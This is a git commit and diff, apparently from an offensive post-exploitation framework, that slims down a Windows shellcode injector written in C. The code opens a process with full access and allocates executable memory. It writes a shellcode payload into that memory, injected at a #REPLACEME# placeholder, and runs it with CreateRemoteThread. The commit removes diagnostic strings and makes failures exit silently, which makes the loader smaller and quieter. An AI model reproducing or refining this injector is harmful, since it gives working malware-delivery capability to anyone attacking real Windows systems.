76317f9ce692ac61e2a5e6a3210704c8f7db978e
m0rv4i <email>
2019-03-13 10:32:39 +0000

    Slim Shellcode & Shellcode_migrate
    * Remove printf statements as there's no console so can't be seen (removes strings and printf stub reducing size)
    * Remove redundant includes
    * Exit if process injection fails in both cases
    * Remove processId parameter from Shellcode.c as there's a while(1) sleep so we only want to inject into this process in this case
    * Only create netsh process in Shellcode_migrate.c if a processId parameter is not passed

--- Files/Shellcode.c
+++ Files/Shellcode.c
@@ -1,9 +1,6 @@
 #define WINVER 0x0501
 
-#include<stdio.h>
 #include<windows.h>
-#include<tlhelp32.h>
-#include<string.h>
 
 #REPLACEME#
 
@@ -11,20 +8,13 @@ void pump(DWORD);
 
 int main(int argc, char *argv[])
 {
-	int x = atoi(argv[1]);
 	STARTUPINFO si = { sizeof(STARTUPINFO) };
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
     PROCESS_INFORMATION pi= {0};
-
-    int processID = GetCurrentProcessId();
-	if (x > 0)
-	{
-		pump(x);
-	} else {
-		pump(processID);
-	}
+	int processID = GetCurrentProcessId();
+	pump(processID);
 	while(1) {Sleep(50000);}
 	return 0;
 }
@@ -36,26 +26,19 @@ void pump(DWORD dwProcessID) {
 	PVOID pRemoteBuffer;
 
 	if(!dwProcessID) {
-		printf("No ProcessID Passed");
+		exit(0);
 	}
 	hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID);
 	if(!hProc) {
-		printf("Cannot OP");
+		exit(0);
 	}
-
 	pRemoteBuffer = VirtualAllocEx(hProc, NULL, sizeof(sc)*2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (!pRemoteBuffer) {
-		printf("Error: VA");
+		exit(0);
 	}
 	if (!WriteProcessMemory(hProc, pRemoteBuffer, sc, sizeof(sc), NULL)) {
-		printf("Error: WPM");
+		exit(0);
 	}
-
-	hRemoteThread = CreateRemoteThread(hProc, NULL, 0, pRemoteBuffer, NULL, 0, NULL);
-	if (!hRemoteThread) {
-		printf("Error: CRT");
-	}
+	CreateRemoteThread(hProc, NULL, 0, pRemoteBuffer, NULL, 0, NULL);
 	CloseHandle(hProc);
-
-	printf("DONE");
 }
